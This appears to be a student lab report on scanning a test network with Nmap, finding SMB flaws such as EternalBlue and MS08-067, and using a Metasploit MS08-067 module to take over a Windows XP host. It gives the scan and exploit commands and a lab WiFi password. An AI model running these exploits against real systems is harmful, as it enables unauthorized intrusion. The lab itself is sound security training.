# Vulnerability Scanning Lab
## Introduction
This project report focuses on analyzing network vulnerabilities using Nmap and Nessus. The objective is to understand how to scan networks, identify active hosts, detect open ports, and exploit vulnerabilities using Metasploit Framework.

## Objectives

* Connect to the test environment and identify the IP address range.

* Perform network scanning to detect active hosts.

* Identify open ports and services running on discovered hosts.

* Scan for vulnerabilities in detected services.

* Utilize Metasploit Framework to exploit vulnerabilities and gain control over systems.

## Task Description

1. Connecting to the Lab Environment
* Connect to the test network WiFi4Hack using the password by hacked password (I$100301).</br>
![Connect to the test network](images/1.PNG) </br>
* Identify the network IP range for scanning.</br>

3. Performing Network Scanning

* Use Zenmap to scan the network: nmap -sP 192.168.37.1/24.</br>
![scan the network](images/2.PNG) </br>
* Identify active hosts and their operating systems.</br>
![scan the network](images/3.PNG) </br>
![scan the network](images/4.PNG) </br>
![scan the network](images/5.PNG) </br>
* Analyze open ports and services for each detected host.</br>

3. Detecting Vulnerabilities

* Use Nmap scripts to scan for vulnerabilities on port 445:</br>
nmap 192.168.37.102 --script vuln -p 445</br>
![scan for vulnerabilities on port 445](images/6.PNG) </br>
nmap 192.168.37.104 --script vuln -p 445 </br>
nmap 192.168.37.109 --script vuln -p 445</br>

* Identified vulnerabilities:</br>
EternalBlue (CVE-2017-0143)</br>
![scan for vulnerabilities on port 445](images/7.PNG) </br>
MS08-067 (CVE-2008-4250)</br>
![scan for vulnerabilities on port 445](images/8.PNG) </br>
4. Exploiting Windows Systems with Metasploit
* Use Metasploit Framework to exploit MS08-067 on a Windows XP machine:</br>
use exploit/windows/smb/ms08_067_netapi
set RHOST 192.168.37.108
exploit </br>
![ Use Metasploit Framework to exploit](images/9.PNG) </br>
* Successfully gain control over the target system.</br>
![Successfully](images/10.PNG) </br>
## Key Observations

Nmap is a powerful tool for detecting active hosts and open ports.</br>

Nmap scripts help identify critical vulnerabilities.</br>

Metasploit Framework enables exploitation of known vulnerabilities.</br>

Windows XP and Windows Server 2003 are highly vulnerable due to outdated security patches.</br>

## Conclusion

This project demonstrated the use of Nmap and Metasploit for network vulnerability scanning and exploitation. We successfully identified security flaws in Windows XP and Windows Server 2003, executed exploits, and gained access to target systems. The exercise highlights the importance of regular security assessments and patch management in preventing cyber threats.
